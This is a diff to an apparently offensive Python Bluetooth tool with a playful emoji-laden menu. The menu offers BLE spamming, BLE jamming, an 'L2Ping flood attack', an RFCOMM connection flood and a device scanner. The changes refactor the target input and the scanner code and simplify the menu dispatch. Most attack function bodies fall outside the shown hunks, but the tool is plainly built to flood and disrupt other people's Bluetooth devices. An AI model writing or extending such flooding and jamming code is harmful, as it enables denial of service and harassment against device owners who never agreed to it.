@@ -29,7 +29,8 @@ class BLESpam(DefaultDelegate):
         print(f"🔔 Notification from BLE device: {data}")
 
 # 🚀 BLE Spamming with User Input!
-def spam_ble(target_mac):
+def spam_ble():
+    target_mac = input("💜 Enter target BLE MAC address: ")
     print(f"🚀 Spamming device {target_mac} 💥💜")
     custom_message = input("💜 Enter your custom spam message: ").encode()
 
@@ -83,31 +84,26 @@ def start_bluetooth():
 
 # 🔎 Bluetooth Device Scanner (FIXED!)
 def scan_bluetooth():
-    """Scan for nearby Bluetooth devices & display results."""
     print("🔎 Scanning for Bluetooth devices... (This may take a few seconds)\n")
-
+    
     try:
-        subprocess.run(["bluetoothctl", "scan", "on"], check=True)
-        time.sleep(10)
+        scanner = Scanner()
+        devices = scanner.scan(10.0)
 
-        result = subprocess.run(["bluetoothctl", "devices"], capture_output=True, text=True)
-        devices = result.stdout.strip().split("\n")
-
-        if len(devices) > 1:
-            print("📡 Found Bluetooth Devices:")
-            for device in devices:
-                print(f"🔹 {device}")
-        else:
+        if not devices:
             print("⚠️ No Bluetooth devices found. Try again!")
+        else:
+            print("📡 Found Bluetooth Devices:")
+            for idx, device in enumerate(devices):
+                print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")
 
-    except subprocess.CalledProcessError as e:
+    except Exception as e:
         print(f"⚠️ Error running Bluetooth scan: {e}")
 
     print("\n✅ Scan complete!\n")
 
 # 💥 CUSTOM L2PING FLOOD ATTACK
 def l2ping_attack():
-    """Send a customizable Bluetooth L2Ping flood attack to a target device."""
     addr = input("💜 Enter Bluetooth Device Address to L2Ping: ")
 
     if os.geteuid() != 0:
@@ -138,7 +134,6 @@ def l2ping_attack():
 
 # ✅ RFCOMM FLOOD FUNCTION!
 def rfcomm_flood():
-    """Flood a Bluetooth device with RFCOMM connection attempts."""
     addr = input("💜 Enter Bluetooth Device Address for RFCOMM Flood: ")
 
     if not addr:
@@ -184,12 +179,13 @@ def main():
         print("🔹 7️⃣ Quit 🚪")
 
         choice = input("💜 Choose an option (1-7): ")
+        functions = [spam_ble, jam_ble, scan_bluetooth, l2ping_attack, rfcomm_flood, start_bluetooth]
 
         if choice == "7":
             print("👋 Goodbye, fren! XOXOXO 💜")
             sys.exit()
         elif choice in "123456":
-            globals()[['spam_ble', 'jam_ble', 'scan_bluetooth', 'l2ping_attack', 'rfcomm_flood', 'start_bluetooth'][int(choice) - 1]]()
+            functions[int(choice)-1]()
 
 if __name__ == "__main__":
     main()
